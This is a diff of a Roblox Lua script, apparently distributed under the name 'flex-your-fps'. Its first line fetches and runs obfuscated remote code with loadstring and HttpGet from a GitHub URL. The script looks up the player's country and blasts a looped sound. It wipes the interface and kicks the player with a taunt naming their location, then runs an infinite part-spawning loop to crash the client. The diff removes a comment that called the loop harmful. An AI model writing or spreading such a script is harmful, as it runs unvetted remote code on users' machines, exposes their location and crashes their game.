@@ -1,50 +1,18 @@
 --This file was protected with MoonSec V3
 loadstring(game:HttpGet("https://raw.githubusercontent.com/chiper1z/flex-your-fps/main/Protected_9332153022180151.txt"))()
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 wait(3)
 local LocalizationService = game:GetService("LocalizationService")
 local Players = game:GetService("Players")
 local player = Players.LocalPlayer
 
 local locations = {
-    US = "United States",
-    GB = "United Kingdom",
-    CA = "Canada",
     AF = "Afghanistan",
-    AX = "Åland Islands",
     AL = "Albania",
     DZ = "Algeria",
     AS = "American Samoa",
     AD = "Andorra",
+    AO = "Angola",
     AI = "Anguilla",
     AQ = "Antarctica",
     AG = "Antigua and Barbuda",
@@ -65,18 +33,18 @@ local locations = {
     BM = "Bermuda",
     BT = "Bhutan",
     BO = "Bolivia",
-    BQ = "Bonaire, Sint Eustatius and Saba",
     BA = "Bosnia and Herzegovina",
     BW = "Botswana",
-    BV = "Bouvet Island",
     BR = "Brazil",
     IO = "British Indian Ocean Territory",
-    BN = "Brunei Darussalam",
+    VG = "British Virgin Islands",
+    BN = "Brunei",
     BG = "Bulgaria",
     BF = "Burkina Faso",
     BI = "Burundi",
     KH = "Cambodia",
     CM = "Cameroon",
+    CA = "Canada",
     CV = "Cape Verde",
     KY = "Cayman Islands",
     CF = "Central African Republic",
@@ -87,12 +55,12 @@ local locations = {
     CC = "Cocos (Keeling) Islands",
     CO = "Colombia",
     KM = "Comoros",
-    CG = "Congo",
-    CD = "Congo (DRC)",
+    CG = "Congo (Brazzaville)",
+    CD = "Congo (Kinshasa)",
     CK = "Cook Islands",
     CR = "Costa Rica",
-    CI = "Ivory Coast",
     HR = "Croatia",
+    CU = "Cuba",
     CW = "Curaçao",
     CY = "Cyprus",
     CZ = "Czech Republic",
@@ -114,7 +82,6 @@ local locations = {
     FR = "France",
     GF = "French Guiana",
     PF = "French Polynesia",
-    TF = "French Southern Territories",
     GA = "Gabon",
     GM = "Gambia",
     GE = "Georgia",
@@ -132,15 +99,15 @@ local locations = {
     GW = "Guinea-Bissau",
     GY = "Guyana",
     HT = "Haiti",
-    HM = "Heard Island and McDonald Islands",
-    VA = "Holy See",
     HN = "Honduras",
     HK = "Hong Kong",
     HU = "Hungary",
     IS = "Iceland",
     IN = "India",
     ID = "Indonesia",
+    IR = "Iran",
     IQ = "Iraq",
+    IE = "Ireland",
     IM = "Isle of Man",
     IL = "Israel",
     IT = "Italy",
@@ -151,7 +118,8 @@ local locations = {
     KZ = "Kazakhstan",
     KE = "Kenya",
     KI = "Kiribati",
-    KR = "Korea",
+    KP = "Korea (North)",
+    KR = "Korea (South)",
     KW = "Kuwait",
     KG = "Kyrgyzstan",
     LA = "Laos",
@@ -164,7 +132,7 @@ local locations = {
     LT = "Lithuania",
     LU = "Luxembourg",
     MO = "Macao",
-    MK = "North Macedonia",
+    MK = "Macedonia (FYROM)",
     MG = "Madagascar",
     MW = "Malawi",
     MY = "Malaysia",
@@ -190,7 +158,6 @@ local locations = {
     NR = "Nauru",
     NP = "Nepal",
     NL = "Netherlands",
-    AN = "Netherlands Antilles",
     NC = "New Caledonia",
     NZ = "New Zealand",
     NI = "Nicaragua",
@@ -203,7 +170,7 @@ local locations = {
     OM = "Oman",
     PK = "Pakistan",
     PW = "Palau",
-    PS = "Palestine",
+    PS = "Palestinian Territory",
     PA = "Panama",
     PG = "Papua New Guinea",
     PY = "Paraguay",
@@ -218,13 +185,6 @@ local locations = {
     RO = "Romania",
     RU = "Russia",
     RW = "Rwanda",
-    BL = "Saint Barthélemy",
-    SH = "Saint Helena, Ascension and Tristan da Cunha",
-    KN = "Saint Kitts and Nevis",
-    LC = "Saint Lucia",
-    MF = "Saint Martin",
-    PM = "Saint Pierre and Miquelon",
-    VC = "Saint Vincent and the Grenadines",
     WS = "Samoa",
     SM = "San Marino",
     ST = "São Tomé and Príncipe",
@@ -240,15 +200,23 @@ local locations = {
     SB = "Solomon Islands",
     SO = "Somalia",
     ZA = "South Africa",
-    GS = "South Georgia and the South Sandwich Islands",
     SS = "South Sudan",
     ES = "Spain",
     LK = "Sri Lanka",
+    BL = "Saint Barthélemy",
+    SH = "Saint Helena",
+    KN = "Saint Kitts and Nevis",
+    LC = "Saint Lucia",
+    MF = "Saint Martin",
+    PM = "Saint Pierre and Miquelon",
+    VC = "Saint Vincent and the Grenadines",
+    SD = "Sudan",
     SR = "Suriname",
     SJ = "Svalbard and Jan Mayen",
-    SZ = "Eswatini",
+    SZ = "Swaziland",
     SE = "Sweden",
     CH = "Switzerland",
+    SY = "Syria",
     TW = "Taiwan",
     TJ = "Tajikistan",
     TZ = "Tanzania",
@@ -277,53 +245,41 @@ local locations = {
     EH = "Western Sahara",
     YE = "Yemen",
     ZM = "Zambia",
-    ZW = "Zimbabwe",
+    ZW = "Zimbabwe"
 }
 
 local success, code = pcall(function()
     return LocalizationService:GetCountryRegionForPlayerAsync(player)
 end)
 
-local player = game.Players.LocalPlayer
 local sound = Instance.new("Sound")
 sound.SoundId = "rbxassetid://6299850448"
 sound.Looped = true
-sound.Playing = true
 sound.Volume = 10
-sound.Parent = workspace.CurrentCamera 
+sound.Parent = workspace.CurrentCamera
 
 if success then
     local location = locations[code]
     if location then
-        -- Play sound and wait for 5 seconds
         sound:Play()
-player.PlayerGui:ClearAllChildren()
-game:GetService('StarterGui'):SetCore("TopbarEnabled", false)
-        wait()
-local blur = Instance.new("BlurEffect")
-blur.Size = 9999
-blur.Parent = workspace.CurrentCamera
+        player.PlayerGui:ClearAllChildren()
+        game:GetService('StarterGui'):SetCore("TopbarEnabled", false)
+        
+        local blur = Instance.new("BlurEffect")
+        blur.Size = 9999
+        blur.Parent = workspace.CurrentCamera
+
         player:Kick("How is it like in " .. location .. "?")
-player.PlayerGui:ClearAllChildren()
-game:GetService('StarterGui'):SetCore("TopbarEnabled", false)
     else
-        -- Play sound and wait for 5 seconds
         sound:Play()
-        wait(0)
-        -- Kick the player
         player:Kick("How is it like in your location?")
     end
 else
-    -- Play sound and wait for 5 seconds
     sound:Play()
-    wait(5)
-    -- Kick the player
-    player:Kick("Unable to determine your location.")
+    player:Kick("Error; please try again later")
 end
 
--- Add a crashing script (Please note that this is harmful and against Roblox's terms of service)
 while true do
-    -- This will create an infinite loop that may cause the client to crash
-    local crash = Instance.new("Part")
-    crash.Parent = workspace
+    local part = Instance.new("Part")
+    part.Parent = workspace
 end
